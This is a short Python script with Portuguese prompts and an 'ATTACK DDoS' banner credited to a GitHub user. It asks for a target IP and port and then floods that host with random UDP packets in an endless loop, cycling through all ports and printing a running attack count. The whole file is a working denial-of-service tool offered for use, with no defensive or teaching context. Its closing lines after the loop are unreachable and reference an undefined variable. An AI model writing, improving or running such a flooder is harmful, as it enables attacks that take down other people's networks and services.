#-*- coding: utf-8 -*-
try:
    from time import sleep
    import socket
    import os
    import random
    import sys
except KeyboardInterrupt:
    print("Você escolheu sair, obrigado!")
    sys.exit()


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

a = "\033[1;31m"
i = "\033[1;36m"
ca = "\033[1;33m"

os.system("clear")

print()
print(a+"""
   A T T A C K  D D o S 
   
Me siga no github https://github.com/GhoooooostDev
Criado por: Ghost.Dev \n\n""")
try:
    ip = input(i+"Digite o IP >: ")
    port = int(input(i+"Porta >: "))
except KeyboardInterrupt:
    print(a+"Você escolheu sair!")
    sys.exit()

print(ca+"[                    ] 0%")
sleep(1)
print(ca+"[#######      ] 25%")
sleep(1)
print(ca+"[###########       ] 50%")
sleep(1)
print(ca+"[##############     ] 75%")
sleep(1)
print(ca+"[##################] 100%")
sleep(3)
sent = 0


while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print (a+"[•]%s ATACANDO %s PARA CANCELAR ^C %s <<<>>>"%(sent,ip,port))


    if port == 65535:
        port = 1

try:
    print (r+"[•]%s ATACANDO %s PARA CANCELAR ^C %s <<<>>>"%(sent,ip,port))
except KeyboardInterrupt:
    print(r+"Você escolheu sair, obrigado!")
    sys.exit()
